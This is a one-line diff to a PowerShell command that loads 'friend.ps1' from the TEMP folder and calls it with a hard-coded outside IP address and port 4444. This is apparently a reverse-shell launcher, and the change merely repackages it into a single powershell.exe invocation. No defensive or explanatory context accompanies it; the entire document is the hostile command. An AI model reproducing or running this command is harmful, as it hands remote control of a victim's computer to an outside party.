@@ -1,1 +1,1 @@
-if(Get-Process friend -ErrorAction SilentlyContinue){powershell.exe -c "Import-Module $env:TEMP\friend.ps1; friend -ip 206.189.226.184 -port 4444"}
+powershell.exe -c "if(Get-Process friend -ErrorAction SilentlyContinue){Import-Module $env:TEMP\friend.ps1; friend -ip 206.189.226.184 -port 4444}"
